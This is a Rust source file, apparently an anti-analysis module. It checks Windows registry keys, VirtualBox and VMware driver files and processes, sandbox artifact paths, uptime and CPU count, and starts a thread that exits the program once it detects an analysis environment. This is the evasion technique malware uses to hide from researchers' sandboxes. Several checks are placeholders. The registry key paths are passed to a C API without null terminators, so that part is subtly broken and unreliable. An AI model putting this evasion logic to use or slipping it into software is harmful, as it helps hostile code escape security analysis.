use std::process;

/// Check if running in a virtual machine
#[cfg(target_os = "windows")]
pub fn is_virtual_machine() -> bool {
    check_vm_registry() || check_vm_files() || check_vm_processes()
}

#[cfg(not(target_os = "windows"))]
pub fn is_virtual_machine() -> bool {
    false
}

/// Check VM indicators in registry
#[cfg(target_os = "windows")]
fn check_vm_registry() -> bool {
    use winapi::um::winreg::{RegOpenKeyExA, RegQueryValueExA, HKEY_LOCAL_MACHINE};
    use winapi::um::winnt::KEY_READ;
    use winapi::shared::minwindef::HKEY;
    
    unsafe {
        let vm_keys = [
            "HARDWARE\\DEVICEMAP\\Scsi\\Scsi Port 0\\Scsi Bus 0\\Target Id 0\\Logical Unit Id 0",
            "HARDWARE\\Description\\System",
            "SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum",
        ];
        
        for key_path in &vm_keys {
            let mut hkey: HKEY = std::ptr::null_mut();
            if RegOpenKeyExA(
                HKEY_LOCAL_MACHINE,
                key_path.as_ptr() as *const i8,
                0,
                KEY_READ,
                &mut hkey,
            ) == 0
            {
                let mut buffer = [0u8; 256];
                let mut buffer_size = 256u32;
                
                if RegQueryValueExA(
                    hkey,
                    "Identifier\0".as_ptr() as *const i8,
                    std::ptr::null_mut(),
                    std::ptr::null_mut(),
                    buffer.as_mut_ptr(),
                    &mut buffer_size,
                ) == 0
                {
                    let value = String::from_utf8_lossy(&buffer[..buffer_size as usize]).to_lowercase();
                    if value.contains("vbox") || value.contains("vmware") || value.contains("virtual") 
                        || value.contains("qemu") || value.contains("xen") {
                        return true;
                    }
                }
            }
        }
    }
    
    false
}

/// Check for VM-related files
#[cfg(target_os = "windows")]
fn check_vm_files() -> bool {
    let vm_files = [
        "C:\\windows\\system32\\drivers\\vmmouse.sys",
        "C:\\windows\\system32\\drivers\\vmhgfs.sys",
        "C:\\windows\\system32\\drivers\\vboxmouse.sys",
        "C:\\windows\\system32\\drivers\\vboxguest.sys",
        "C:\\windows\\system32\\drivers\\vboxsf.sys",
        "C:\\windows\\system32\\vboxdisp.dll",
        "C:\\windows\\system32\\vboxhook.dll",
        "C:\\windows\\system32\\vboxoglerrorspu.dll",
    ];
    
    for file in &vm_files {
        if std::path::Path::new(file).exists() {
            return true;
        }
    }
    
    false
}

/// Check for VM-related processes
#[cfg(target_os = "windows")]
fn check_vm_processes() -> bool {
    use winapi::um::tlhelp32::{CreateToolhelp32Snapshot, Process32FirstW, Process32NextW, PROCESSENTRY32W, TH32CS_SNAPPROCESS};
    use winapi::um::handleapi::CloseHandle;
    use std::ffi::OsString;
    use std::os::windows::ffi::OsStringExt;
    
    let vm_processes = [
        "vboxservice.exe", "vboxtray.exe", "vmtoolsd.exe", "vmwaretray.exe",
        "vmwareuser.exe", "vmacthlp.exe", "vmsrvc.exe", "vmusrvc.exe",
        "xenservice.exe", "qemu-ga.exe",
    ];
    
    unsafe {
        let snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if snapshot == winapi::um::handleapi::INVALID_HANDLE_VALUE {
            return false;
        }
        
        let mut entry: PROCESSENTRY32W = std::mem::zeroed();
        entry.dwSize = std::mem::size_of::<PROCESSENTRY32W>() as u32;
        
        if Process32FirstW(snapshot, &mut entry) != 0 {
            loop {
                let len = entry.szExeFile.iter().position(|&c| c == 0).unwrap_or(260);
                let name = OsString::from_wide(&entry.szExeFile[..len])
                    .to_string_lossy()
                    .to_lowercase();
                
                for vm_proc in &vm_processes {
                    if name.contains(vm_proc) {
                        CloseHandle(snapshot);
                        return true;
                    }
                }
                
                if Process32NextW(snapshot, &mut entry) == 0 {
                    break;
                }
            }
        }
        
        CloseHandle(snapshot);
    }
    
    false
}

/// Check for VM MAC addresses
#[cfg(target_os = "windows")]
fn check_vm_mac() -> bool {
    // VM vendors use specific MAC address prefixes
    let _vm_mac_prefixes = [
        "00:05:69", "00:0C:29", "00:1C:14", "00:50:56", // VMware
        "08:00:27", // VirtualBox
        "00:16:3E", // Xen
        "00:1C:42", // Parallels
    ];
    
    // This is a simplified check - in production you'd query network adapters
    // For now, we'll return false as a placeholder
    false
}

/// Check if running in a sandbox environment
#[cfg(target_os = "windows")]
pub fn is_sandbox() -> bool {
    check_sandbox_artifacts()
}

#[cfg(not(target_os = "windows"))]
pub fn is_sandbox() -> bool {
    false
}

/// Check for sandbox artifacts
#[cfg(target_os = "windows")]
fn check_sandbox_artifacts() -> bool {
    // Check for common sandbox files
    let sandbox_files = [
        "C:\\analysis\\malware.exe",
        "C:\\sample.exe",
        "C:\\sandbox\\",
    ];
    
    for file in &sandbox_files {
        if std::path::Path::new(file).exists() {
            println!("[ANTI-ANALYSIS] ⚠️ Sandbox artifact found: {}", file);
            return true;
        }
    }
    
    // Check for Sandboxie
    if std::path::Path::new("C:\\Program Files\\Sandboxie").exists() {
        println!("[ANTI-ANALYSIS] ⚠️ Sandboxie detected");
        return true;
    }
    
    println!("[ANTI-ANALYSIS] ✓ No sandbox artifacts found");
    false
}

/// Check for user interaction (sandboxes often have no real user activity)
fn check_user_interaction() -> bool {
    // Disabled - too many false positives
    println!("[ANTI-ANALYSIS] ✓ User interaction check skipped (disabled)");
    false
}

#[cfg(target_os = "windows")]
fn get_cursor_position() -> (i32, i32) {
    use winapi::um::winuser::GetCursorPos;
    use winapi::shared::windef::POINT;
    
    unsafe {
        let mut point: POINT = std::mem::zeroed();
        GetCursorPos(&mut point);
        (point.x, point.y)
    }
}

#[cfg(not(target_os = "windows"))]
fn get_cursor_position() -> (i32, i32) {
    (0, 0)
}

/// Check system uptime (sandboxes often have very low uptime)
#[cfg(target_os = "windows")]
fn check_system_uptime() -> bool {
    use winapi::um::sysinfoapi::GetTickCount64;
    
    unsafe {
        let uptime_ms = GetTickCount64();
        let uptime_minutes = uptime_ms / 1000 / 60;
        
        // If system has been up for less than 5 minutes, suspicious (reduced from 10)
        let result = uptime_minutes < 5;
        if result {
            println!("[ANTI-ANALYSIS] ⚠️ Low system uptime detected: {} minutes", uptime_minutes);
        } else {
            println!("[ANTI-ANALYSIS] ✓ System uptime check passed ({} minutes)", uptime_minutes);
        }
        result
    }
}

#[cfg(not(target_os = "windows"))]
fn check_system_uptime() -> bool {
    false
}

/// Check for low resource allocation (VMs/sandboxes often have limited resources)
#[cfg(target_os = "windows")]
pub fn check_system_resources() -> bool {
    use winapi::um::sysinfoapi::{GetSystemInfo, SYSTEM_INFO};
    
    unsafe {
        let mut sys_info: SYSTEM_INFO = std::mem::zeroed();
        GetSystemInfo(&mut sys_info);
        
        // Check if less than 2 CPU cores (suspicious for modern systems)
        if sys_info.dwNumberOfProcessors < 2 {
            return true;
        }
    }
    
    // Check RAM (would need additional API calls)
    false
}

#[cfg(not(target_os = "windows"))]
pub fn check_system_resources() -> bool {
    false
}

/// Check for analysis tools in memory
pub fn check_memory_artifacts() -> bool {
    // This would require more advanced memory scanning
    // Placeholder for now
    false
}

/// Run all anti-analysis checks
pub fn run_all_checks() -> bool {
    is_virtual_machine() || is_sandbox()
}

/// Continuously monitor for analysis environment and exit if found
pub fn start_anti_analysis_monitor() {
    std::thread::spawn(|| {
        loop {
            if run_all_checks() {
                eprintln!("[SECURITY] Analysis environment detected. Exiting...");
                process::exit(1);
            }
            std::thread::sleep(std::time::Duration::from_secs(10));
        }
    });
}

/// Single check - returns true if analysis environment detected
pub fn is_being_analyzed() -> bool {
    run_all_checks()
}
